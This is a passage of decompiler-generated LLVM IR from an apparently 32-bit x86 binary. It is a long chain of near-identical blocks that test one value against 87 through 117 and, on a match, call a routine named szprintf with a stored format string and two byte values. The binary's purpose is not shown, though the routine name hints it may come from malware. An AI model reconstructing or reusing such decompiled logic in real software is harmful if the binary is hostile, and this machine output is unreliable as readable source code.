  store i32 %v2_804af49, i32* @ebx, align 4
  %v4_804af5b = call i32 @szprintf(i32 %v2_804af49, i32 ptrtoint ([13 x i8]* @global_var_80596e0.115 to i32), i32 %v1_804af3a)
  br label %dec_label_pc_804af60

dec_label_pc_804af60:                             ; preds = %dec_label_pc_804af2a, %dec_label_pc_804af30
  %v13_804af60 = icmp eq i32 %v2_8049ce5, 87
  %v1_804af64 = icmp eq i1 %v13_804af60, false
  br i1 %v1_804af64, label %dec_label_pc_804af96, label %dec_label_pc_804af66

dec_label_pc_804af66:                             ; preds = %dec_label_pc_804af60
  %v0_804af66 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804af66 = zext i8 %v0_804af66 to i32
  store i32 %v1_804af66, i32* @edx, align 4
  %v0_804af70 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804af70 = zext i8 %v0_804af70 to i32
  %v2_804af7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af7f, i32* @ebx, align 4
  %v4_804af91 = call i32 @szprintf(i32 %v2_804af7f, i32 ptrtoint ([13 x i8]* @global_var_80596ed.116 to i32), i32 %v1_804af70)
  br label %dec_label_pc_804af96

dec_label_pc_804af96:                             ; preds = %dec_label_pc_804af60, %dec_label_pc_804af66
  %v13_804af96 = icmp eq i32 %v2_8049ce5, 88
  %v1_804af9a = icmp eq i1 %v13_804af96, false
  br i1 %v1_804af9a, label %dec_label_pc_804afcc, label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %dec_label_pc_804af96
  %v0_804af9c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804af9c = zext i8 %v0_804af9c to i32
  store i32 %v1_804af9c, i32* @edx, align 4
  %v0_804afa6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804afa6 = zext i8 %v0_804afa6 to i32
  %v2_804afb5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afb5, i32* @ebx, align 4
  %v4_804afc7 = call i32 @szprintf(i32 %v2_804afb5, i32 ptrtoint ([13 x i8]* @global_var_80596fa.117 to i32), i32 %v1_804afa6)
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af96, %dec_label_pc_804af9c
  %v13_804afcc = icmp eq i32 %v2_8049ce5, 89
  %v1_804afd0 = icmp eq i1 %v13_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804b002, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v0_804afd2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804afd2 = zext i8 %v0_804afd2 to i32
  store i32 %v1_804afd2, i32* @edx, align 4
  %v0_804afdc = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804afdc = zext i8 %v0_804afdc to i32
  %v2_804afeb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afeb, i32* @ebx, align 4
  %v4_804affd = call i32 @szprintf(i32 %v2_804afeb, i32 ptrtoint ([13 x i8]* @global_var_8059707.118 to i32), i32 %v1_804afdc)
  br label %dec_label_pc_804b002

dec_label_pc_804b002:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804afd2
  %v13_804b002 = icmp eq i32 %v2_8049ce5, 90
  %v1_804b006 = icmp eq i1 %v13_804b002, false
  br i1 %v1_804b006, label %dec_label_pc_804b038, label %dec_label_pc_804b008

dec_label_pc_804b008:                             ; preds = %dec_label_pc_804b002
  %v0_804b008 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b008 = zext i8 %v0_804b008 to i32
  store i32 %v1_804b008, i32* @edx, align 4
  %v0_804b012 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b012 = zext i8 %v0_804b012 to i32
  %v2_804b021 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b021, i32* @ebx, align 4
  %v4_804b033 = call i32 @szprintf(i32 %v2_804b021, i32 ptrtoint ([13 x i8]* @global_var_8059714.119 to i32), i32 %v1_804b012)
  br label %dec_label_pc_804b038

dec_label_pc_804b038:                             ; preds = %dec_label_pc_804b002, %dec_label_pc_804b008
  %v13_804b038 = icmp eq i32 %v2_8049ce5, 91
  %v1_804b03c = icmp eq i1 %v13_804b038, false
  br i1 %v1_804b03c, label %dec_label_pc_804b06e, label %dec_label_pc_804b03e

dec_label_pc_804b03e:                             ; preds = %dec_label_pc_804b038
  %v0_804b03e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b03e = zext i8 %v0_804b03e to i32
  store i32 %v1_804b03e, i32* @edx, align 4
  %v0_804b048 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b048 = zext i8 %v0_804b048 to i32
  %v2_804b057 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b057, i32* @ebx, align 4
  %v4_804b069 = call i32 @szprintf(i32 %v2_804b057, i32 ptrtoint ([13 x i8]* @global_var_8059721.120 to i32), i32 %v1_804b048)
  br label %dec_label_pc_804b06e

dec_label_pc_804b06e:                             ; preds = %dec_label_pc_804b038, %dec_label_pc_804b03e
  %v13_804b06e = icmp eq i32 %v2_8049ce5, 92
  %v1_804b072 = icmp eq i1 %v13_804b06e, false
  br i1 %v1_804b072, label %dec_label_pc_804b0a4, label %dec_label_pc_804b074

dec_label_pc_804b074:                             ; preds = %dec_label_pc_804b06e
  %v0_804b074 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b074 = zext i8 %v0_804b074 to i32
  store i32 %v1_804b074, i32* @edx, align 4
  %v0_804b07e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b07e = zext i8 %v0_804b07e to i32
  %v2_804b08d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b08d, i32* @ebx, align 4
  %v4_804b09f = call i32 @szprintf(i32 %v2_804b08d, i32 ptrtoint ([13 x i8]* @global_var_805972e.121 to i32), i32 %v1_804b07e)
  br label %dec_label_pc_804b0a4

dec_label_pc_804b0a4:                             ; preds = %dec_label_pc_804b06e, %dec_label_pc_804b074
  %v13_804b0a4 = icmp eq i32 %v2_8049ce5, 93
  %v1_804b0a8 = icmp eq i1 %v13_804b0a4, false
  br i1 %v1_804b0a8, label %dec_label_pc_804b0da, label %dec_label_pc_804b0aa

dec_label_pc_804b0aa:                             ; preds = %dec_label_pc_804b0a4
  %v0_804b0aa = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b0aa = zext i8 %v0_804b0aa to i32
  store i32 %v1_804b0aa, i32* @edx, align 4
  %v0_804b0b4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b0b4 = zext i8 %v0_804b0b4 to i32
  %v2_804b0c3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0c3, i32* @ebx, align 4
  %v4_804b0d5 = call i32 @szprintf(i32 %v2_804b0c3, i32 ptrtoint ([13 x i8]* @global_var_805973b.122 to i32), i32 %v1_804b0b4)
  br label %dec_label_pc_804b0da

dec_label_pc_804b0da:                             ; preds = %dec_label_pc_804b0a4, %dec_label_pc_804b0aa
  %v13_804b0da = icmp eq i32 %v2_8049ce5, 94
  %v1_804b0de = icmp eq i1 %v13_804b0da, false
  br i1 %v1_804b0de, label %dec_label_pc_804b110, label %dec_label_pc_804b0e0

dec_label_pc_804b0e0:                             ; preds = %dec_label_pc_804b0da
  %v0_804b0e0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b0e0 = zext i8 %v0_804b0e0 to i32
  store i32 %v1_804b0e0, i32* @edx, align 4
  %v0_804b0ea = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b0ea = zext i8 %v0_804b0ea to i32
  %v2_804b0f9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0f9, i32* @ebx, align 4
  %v4_804b10b = call i32 @szprintf(i32 %v2_804b0f9, i32 ptrtoint ([13 x i8]* @global_var_80594ad.72 to i32), i32 %v1_804b0ea)
  br label %dec_label_pc_804b110

dec_label_pc_804b110:                             ; preds = %dec_label_pc_804b0da, %dec_label_pc_804b0e0
  %v13_804b110 = icmp eq i32 %v2_8049ce5, 95
  %v1_804b114 = icmp eq i1 %v13_804b110, false
  br i1 %v1_804b114, label %dec_label_pc_804b146, label %dec_label_pc_804b116

dec_label_pc_804b116:                             ; preds = %dec_label_pc_804b110
  %v0_804b116 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b116 = zext i8 %v0_804b116 to i32
  store i32 %v1_804b116, i32* @edx, align 4
  %v0_804b120 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b120 = zext i8 %v0_804b120 to i32
  %v2_804b12f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b12f, i32* @ebx, align 4
  %v4_804b141 = call i32 @szprintf(i32 %v2_804b12f, i32 ptrtoint ([13 x i8]* @global_var_8059748.123 to i32), i32 %v1_804b120)
  br label %dec_label_pc_804b146

dec_label_pc_804b146:                             ; preds = %dec_label_pc_804b110, %dec_label_pc_804b116
  %v10_804b146 = icmp eq i32 %v2_8049ce5, 96
  %v1_804b14a = icmp eq i1 %v10_804b146, false
  br i1 %v1_804b14a, label %dec_label_pc_804b17c, label %dec_label_pc_804b14c

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b146
  %v0_804b14c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b14c = zext i8 %v0_804b14c to i32
  store i32 %v1_804b14c, i32* @edx, align 4
  %v0_804b156 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b156 = zext i8 %v0_804b156 to i32
  %v2_804b165 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b165, i32* @ebx, align 4
  %v4_804b177 = call i32 @szprintf(i32 %v2_804b165, i32 ptrtoint ([13 x i8]* @global_var_80594d4.75 to i32), i32 %v1_804b156)
  br label %dec_label_pc_804b17c

dec_label_pc_804b17c:                             ; preds = %dec_label_pc_804b146, %dec_label_pc_804b14c
  %v13_804b17c = icmp eq i32 %v2_8049ce5, 97
  %v1_804b180 = icmp eq i1 %v13_804b17c, false
  br i1 %v1_804b180, label %dec_label_pc_804b1b2, label %dec_label_pc_804b182

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b17c
  %v0_804b182 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b182 = zext i8 %v0_804b182 to i32
  store i32 %v1_804b182, i32* @edx, align 4
  %v0_804b18c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b18c = zext i8 %v0_804b18c to i32
  %v2_804b19b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19b, i32* @ebx, align 4
  %v4_804b1ad = call i32 @szprintf(i32 %v2_804b19b, i32 ptrtoint ([13 x i8]* @global_var_8059755.124 to i32), i32 %v1_804b18c)
  br label %dec_label_pc_804b1b2

dec_label_pc_804b1b2:                             ; preds = %dec_label_pc_804b17c, %dec_label_pc_804b182
  %v13_804b1b2 = icmp eq i32 %v2_8049ce5, 98
  %v1_804b1b6 = icmp eq i1 %v13_804b1b2, false
  br i1 %v1_804b1b6, label %dec_label_pc_804b1e8, label %dec_label_pc_804b1b8

dec_label_pc_804b1b8:                             ; preds = %dec_label_pc_804b1b2
  %v0_804b1b8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b1b8 = zext i8 %v0_804b1b8 to i32
  store i32 %v1_804b1b8, i32* @edx, align 4
  %v0_804b1c2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b1c2 = zext i8 %v0_804b1c2 to i32
  %v2_804b1d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1d1, i32* @ebx, align 4
  %v4_804b1e3 = call i32 @szprintf(i32 %v2_804b1d1, i32 ptrtoint ([13 x i8]* @global_var_8059762.125 to i32), i32 %v1_804b1c2)
  br label %dec_label_pc_804b1e8

dec_label_pc_804b1e8:                             ; preds = %dec_label_pc_804b1b2, %dec_label_pc_804b1b8
  %v13_804b1e8 = icmp eq i32 %v2_8049ce5, 99
  %v1_804b1ec = icmp eq i1 %v13_804b1e8, false
  br i1 %v1_804b1ec, label %dec_label_pc_804b21e, label %dec_label_pc_804b1ee

dec_label_pc_804b1ee:                             ; preds = %dec_label_pc_804b1e8
  %v0_804b1ee = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b1ee = zext i8 %v0_804b1ee to i32
  store i32 %v1_804b1ee, i32* @edx, align 4
  %v0_804b1f8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b1f8 = zext i8 %v0_804b1f8 to i32
  %v2_804b207 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b207, i32* @ebx, align 4
  %v4_804b219 = call i32 @szprintf(i32 %v2_804b207, i32 ptrtoint ([13 x i8]* @global_var_805976f.126 to i32), i32 %v1_804b1f8)
  br label %dec_label_pc_804b21e

dec_label_pc_804b21e:                             ; preds = %dec_label_pc_804b1e8, %dec_label_pc_804b1ee
  %v13_804b21e = icmp eq i32 %v2_8049ce5, 100
  %v1_804b222 = icmp eq i1 %v13_804b21e, false
  br i1 %v1_804b222, label %dec_label_pc_804b254, label %dec_label_pc_804b224

dec_label_pc_804b224:                             ; preds = %dec_label_pc_804b21e
  %v0_804b224 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b224 = zext i8 %v0_804b224 to i32
  store i32 %v1_804b224, i32* @edx, align 4
  %v0_804b22e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b22e = zext i8 %v0_804b22e to i32
  %v2_804b23d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b23d, i32* @ebx, align 4
  %v4_804b24f = call i32 @szprintf(i32 %v2_804b23d, i32 ptrtoint ([13 x i8]* @global_var_805977c.127 to i32), i32 %v1_804b22e)
  br label %dec_label_pc_804b254

dec_label_pc_804b254:                             ; preds = %dec_label_pc_804b21e, %dec_label_pc_804b224
  %v13_804b254 = icmp eq i32 %v2_8049ce5, 101
  %v1_804b258 = icmp eq i1 %v13_804b254, false
  br i1 %v1_804b258, label %dec_label_pc_804b28a, label %dec_label_pc_804b25a

dec_label_pc_804b25a:                             ; preds = %dec_label_pc_804b254
  %v0_804b25a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b25a = zext i8 %v0_804b25a to i32
  store i32 %v1_804b25a, i32* @edx, align 4
  %v0_804b264 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b264 = zext i8 %v0_804b264 to i32
  %v2_804b273 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b273, i32* @ebx, align 4
  %v4_804b285 = call i32 @szprintf(i32 %v2_804b273, i32 ptrtoint ([13 x i8]* @global_var_8059789.128 to i32), i32 %v1_804b264)
  br label %dec_label_pc_804b28a

dec_label_pc_804b28a:                             ; preds = %dec_label_pc_804b254, %dec_label_pc_804b25a
  %v13_804b28a = icmp eq i32 %v2_8049ce5, 102
  %v1_804b28e = icmp eq i1 %v13_804b28a, false
  br i1 %v1_804b28e, label %dec_label_pc_804b2c0, label %dec_label_pc_804b290

dec_label_pc_804b290:                             ; preds = %dec_label_pc_804b28a
  %v0_804b290 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b290 = zext i8 %v0_804b290 to i32
  store i32 %v1_804b290, i32* @edx, align 4
  %v0_804b29a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b29a = zext i8 %v0_804b29a to i32
  %v2_804b2a9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2a9, i32* @ebx, align 4
  %v4_804b2bb = call i32 @szprintf(i32 %v2_804b2a9, i32 ptrtoint ([12 x i8]* @global_var_8059796.129 to i32), i32 %v1_804b29a)
  br label %dec_label_pc_804b2c0

dec_label_pc_804b2c0:                             ; preds = %dec_label_pc_804b28a, %dec_label_pc_804b290
  %v13_804b2c0 = icmp eq i32 %v2_8049ce5, 103
  %v1_804b2c4 = icmp eq i1 %v13_804b2c0, false
  br i1 %v1_804b2c4, label %dec_label_pc_804b2f6, label %dec_label_pc_804b2c6

dec_label_pc_804b2c6:                             ; preds = %dec_label_pc_804b2c0
  %v0_804b2c6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b2c6 = zext i8 %v0_804b2c6 to i32
  store i32 %v1_804b2c6, i32* @edx, align 4
  %v0_804b2d0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b2d0 = zext i8 %v0_804b2d0 to i32
  %v2_804b2df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2df, i32* @ebx, align 4
  %v4_804b2f1 = call i32 @szprintf(i32 %v2_804b2df, i32 ptrtoint ([13 x i8]* @global_var_80597a2.130 to i32), i32 %v1_804b2d0)
  br label %dec_label_pc_804b2f6

dec_label_pc_804b2f6:                             ; preds = %dec_label_pc_804b2c0, %dec_label_pc_804b2c6
  %v13_804b2f6 = icmp eq i32 %v2_8049ce5, 104
  %v1_804b2fa = icmp eq i1 %v13_804b2f6, false
  br i1 %v1_804b2fa, label %dec_label_pc_804b32c, label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2f6
  %v0_804b2fc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b2fc = zext i8 %v0_804b2fc to i32
  store i32 %v1_804b2fc, i32* @edx, align 4
  %v0_804b306 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b306 = zext i8 %v0_804b306 to i32
  %v2_804b315 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b315, i32* @ebx, align 4
  %v4_804b327 = call i32 @szprintf(i32 %v2_804b315, i32 ptrtoint ([13 x i8]* @global_var_80597af.131 to i32), i32 %v1_804b306)
  br label %dec_label_pc_804b32c

dec_label_pc_804b32c:                             ; preds = %dec_label_pc_804b2f6, %dec_label_pc_804b2fc
  %v13_804b32c = icmp eq i32 %v2_8049ce5, 105
  %v1_804b330 = icmp eq i1 %v13_804b32c, false
  br i1 %v1_804b330, label %dec_label_pc_804b362, label %dec_label_pc_804b332

dec_label_pc_804b332:                             ; preds = %dec_label_pc_804b32c
  %v0_804b332 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b332 = zext i8 %v0_804b332 to i32
  store i32 %v1_804b332, i32* @edx, align 4
  %v0_804b33c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b33c = zext i8 %v0_804b33c to i32
  %v2_804b34b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b34b, i32* @ebx, align 4
  %v4_804b35d = call i32 @szprintf(i32 %v2_804b34b, i32 ptrtoint ([13 x i8]* @global_var_80597bc.132 to i32), i32 %v1_804b33c)
  br label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b32c, %dec_label_pc_804b332
  %v13_804b362 = icmp eq i32 %v2_8049ce5, 106
  %v1_804b366 = icmp eq i1 %v13_804b362, false
  br i1 %v1_804b366, label %dec_label_pc_804b398, label %dec_label_pc_804b368

dec_label_pc_804b368:                             ; preds = %dec_label_pc_804b362
  %v0_804b368 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b368 = zext i8 %v0_804b368 to i32
  store i32 %v1_804b368, i32* @edx, align 4
  %v0_804b372 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b372 = zext i8 %v0_804b372 to i32
  %v2_804b381 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b381, i32* @ebx, align 4
  %v4_804b393 = call i32 @szprintf(i32 %v2_804b381, i32 ptrtoint ([12 x i8]* @global_var_80597c9.133 to i32), i32 %v1_804b372)
  br label %dec_label_pc_804b398

dec_label_pc_804b398:                             ; preds = %dec_label_pc_804b362, %dec_label_pc_804b368
  %v13_804b398 = icmp eq i32 %v2_8049ce5, 107
  %v1_804b39c = icmp eq i1 %v13_804b398, false
  br i1 %v1_804b39c, label %dec_label_pc_804b3ce, label %dec_label_pc_804b39e

dec_label_pc_804b39e:                             ; preds = %dec_label_pc_804b398
  %v0_804b39e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b39e = zext i8 %v0_804b39e to i32
  store i32 %v1_804b39e, i32* @edx, align 4
  %v0_804b3a8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b3a8 = zext i8 %v0_804b3a8 to i32
  %v2_804b3b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b7, i32* @ebx, align 4
  %v4_804b3c9 = call i32 @szprintf(i32 %v2_804b3b7, i32 ptrtoint ([13 x i8]* @global_var_80597d5.134 to i32), i32 %v1_804b3a8)
  br label %dec_label_pc_804b3ce

dec_label_pc_804b3ce:                             ; preds = %dec_label_pc_804b398, %dec_label_pc_804b39e
  %v13_804b3ce = icmp eq i32 %v2_8049ce5, 108
  %v1_804b3d2 = icmp eq i1 %v13_804b3ce, false
  br i1 %v1_804b3d2, label %dec_label_pc_804b404, label %dec_label_pc_804b3d4

dec_label_pc_804b3d4:                             ; preds = %dec_label_pc_804b3ce
  %v0_804b3d4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b3d4 = zext i8 %v0_804b3d4 to i32
  store i32 %v1_804b3d4, i32* @edx, align 4
  %v0_804b3de = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b3de = zext i8 %v0_804b3de to i32
  %v2_804b3ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ed, i32* @ebx, align 4
  %v4_804b3ff = call i32 @szprintf(i32 %v2_804b3ed, i32 ptrtoint ([14 x i8]* @global_var_80597e2.135 to i32), i32 %v1_804b3de)
  br label %dec_label_pc_804b404

dec_label_pc_804b404:                             ; preds = %dec_label_pc_804b3ce, %dec_label_pc_804b3d4
  %v13_804b404 = icmp eq i32 %v2_8049ce5, 109
  %v1_804b408 = icmp eq i1 %v13_804b404, false
  br i1 %v1_804b408, label %dec_label_pc_804b43a, label %dec_label_pc_804b40a

dec_label_pc_804b40a:                             ; preds = %dec_label_pc_804b404
  %v0_804b40a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b40a = zext i8 %v0_804b40a to i32
  store i32 %v1_804b40a, i32* @edx, align 4
  %v0_804b414 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b414 = zext i8 %v0_804b414 to i32
  %v2_804b423 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b423, i32* @ebx, align 4
  %v4_804b435 = call i32 @szprintf(i32 %v2_804b423, i32 ptrtoint ([14 x i8]* @global_var_80597f0.136 to i32), i32 %v1_804b414)
  br label %dec_label_pc_804b43a

dec_label_pc_804b43a:                             ; preds = %dec_label_pc_804b404, %dec_label_pc_804b40a
  %v13_804b43a = icmp eq i32 %v2_8049ce5, 110
  %v1_804b43e = icmp eq i1 %v13_804b43a, false
  br i1 %v1_804b43e, label %dec_label_pc_804b470, label %dec_label_pc_804b440

dec_label_pc_804b440:                             ; preds = %dec_label_pc_804b43a
  %v0_804b440 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b440 = zext i8 %v0_804b440 to i32
  store i32 %v1_804b440, i32* @edx, align 4
  %v0_804b44a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b44a = zext i8 %v0_804b44a to i32
  %v2_804b459 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b459, i32* @ebx, align 4
  %v4_804b46b = call i32 @szprintf(i32 %v2_804b459, i32 ptrtoint ([13 x i8]* @global_var_80597fe.137 to i32), i32 %v1_804b44a)
  br label %dec_label_pc_804b470

dec_label_pc_804b470:                             ; preds = %dec_label_pc_804b43a, %dec_label_pc_804b440
  %v13_804b470 = icmp eq i32 %v2_8049ce5, 111
  %v1_804b474 = icmp eq i1 %v13_804b470, false
  br i1 %v1_804b474, label %dec_label_pc_804b4a6, label %dec_label_pc_804b476

dec_label_pc_804b476:                             ; preds = %dec_label_pc_804b470
  %v0_804b476 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b476 = zext i8 %v0_804b476 to i32
  store i32 %v1_804b476, i32* @edx, align 4
  %v0_804b480 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b480 = zext i8 %v0_804b480 to i32
  %v2_804b48f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b48f, i32* @ebx, align 4
  %v4_804b4a1 = call i32 @szprintf(i32 %v2_804b48f, i32 ptrtoint ([14 x i8]* @global_var_805980b.138 to i32), i32 %v1_804b480)
  br label %dec_label_pc_804b4a6

dec_label_pc_804b4a6:                             ; preds = %dec_label_pc_804b470, %dec_label_pc_804b476
  %v10_804b4a6 = icmp eq i32 %v2_8049ce5, 112
  %v1_804b4aa = icmp eq i1 %v10_804b4a6, false
  br i1 %v1_804b4aa, label %dec_label_pc_804b4dc, label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b4a6
  %v0_804b4ac = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b4ac = zext i8 %v0_804b4ac to i32
  store i32 %v1_804b4ac, i32* @edx, align 4
  %v0_804b4b6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b4b6 = zext i8 %v0_804b4b6 to i32
  %v2_804b4c5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4c5, i32* @ebx, align 4
  %v4_804b4d7 = call i32 @szprintf(i32 %v2_804b4c5, i32 ptrtoint ([14 x i8]* @global_var_8059819.139 to i32), i32 %v1_804b4b6)
  br label %dec_label_pc_804b4dc

dec_label_pc_804b4dc:                             ; preds = %dec_label_pc_804b4a6, %dec_label_pc_804b4ac
  %v13_804b4dc = icmp eq i32 %v2_8049ce5, 113
  %v1_804b4e0 = icmp eq i1 %v13_804b4dc, false
  br i1 %v1_804b4e0, label %dec_label_pc_804b512, label %dec_label_pc_804b4e2

dec_label_pc_804b4e2:                             ; preds = %dec_label_pc_804b4dc
  %v0_804b4e2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b4e2 = zext i8 %v0_804b4e2 to i32
  store i32 %v1_804b4e2, i32* @edx, align 4
  %v0_804b4ec = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b4ec = zext i8 %v0_804b4ec to i32
  %v2_804b4fb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4fb, i32* @ebx, align 4
  %v4_804b50d = call i32 @szprintf(i32 %v2_804b4fb, i32 ptrtoint ([13 x i8]* @global_var_8059827.140 to i32), i32 %v1_804b4ec)
  br label %dec_label_pc_804b512

dec_label_pc_804b512:                             ; preds = %dec_label_pc_804b4dc, %dec_label_pc_804b4e2
  %v13_804b512 = icmp eq i32 %v2_8049ce5, 114
  %v1_804b516 = icmp eq i1 %v13_804b512, false
  br i1 %v1_804b516, label %dec_label_pc_804b548, label %dec_label_pc_804b518

dec_label_pc_804b518:                             ; preds = %dec_label_pc_804b512
  %v0_804b518 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b518 = zext i8 %v0_804b518 to i32
  store i32 %v1_804b518, i32* @edx, align 4
  %v0_804b522 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b522 = zext i8 %v0_804b522 to i32
  %v2_804b531 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b531, i32* @ebx, align 4
  %v4_804b543 = call i32 @szprintf(i32 %v2_804b531, i32 ptrtoint ([14 x i8]* @global_var_8059834.141 to i32), i32 %v1_804b522)
  br label %dec_label_pc_804b548

dec_label_pc_804b548:                             ; preds = %dec_label_pc_804b512, %dec_label_pc_804b518
  %v13_804b548 = icmp eq i32 %v2_8049ce5, 115
  %v1_804b54c = icmp eq i1 %v13_804b548, false
  br i1 %v1_804b54c, label %dec_label_pc_804b57e, label %dec_label_pc_804b54e

dec_label_pc_804b54e:                             ; preds = %dec_label_pc_804b548
  %v0_804b54e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b54e = zext i8 %v0_804b54e to i32
  store i32 %v1_804b54e, i32* @edx, align 4
  %v0_804b558 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b558 = zext i8 %v0_804b558 to i32
  %v2_804b567 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b567, i32* @ebx, align 4
  %v4_804b579 = call i32 @szprintf(i32 %v2_804b567, i32 ptrtoint ([13 x i8]* @global_var_8059842.142 to i32), i32 %v1_804b558)
  br label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %dec_label_pc_804b548, %dec_label_pc_804b54e
  %v13_804b57e = icmp eq i32 %v2_8049ce5, 116
  %v1_804b582 = icmp eq i1 %v13_804b57e, false
  br i1 %v1_804b582, label %dec_label_pc_804b5b4, label %dec_label_pc_804b584

dec_label_pc_804b584:                             ; preds = %dec_label_pc_804b57e
  %v0_804b584 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b584 = zext i8 %v0_804b584 to i32
  store i32 %v1_804b584, i32* @edx, align 4
  %v0_804b58e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b58e = zext i8 %v0_804b58e to i32
  %v2_804b59d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b59d, i32* @ebx, align 4
  %v4_804b5af = call i32 @szprintf(i32 %v2_804b59d, i32 ptrtoint ([13 x i8]* @global_var_805984f.143 to i32), i32 %v1_804b58e)
  br label %dec_label_pc_804b5b4

dec_label_pc_804b5b4:                             ; preds = %dec_label_pc_804b57e, %dec_label_pc_804b584
  %v13_804b5b4 = icmp eq i32 %v2_8049ce5, 117
  %v1_804b5b8 = icmp eq i1 %v13_804b5b4, false
  br i1 %v1_804b5b8, label %dec_label_pc_804b5ea, label %dec_label_pc_804b5ba

dec_label_pc_804b5ba:                             ; preds = %dec_label_pc_804b5b4
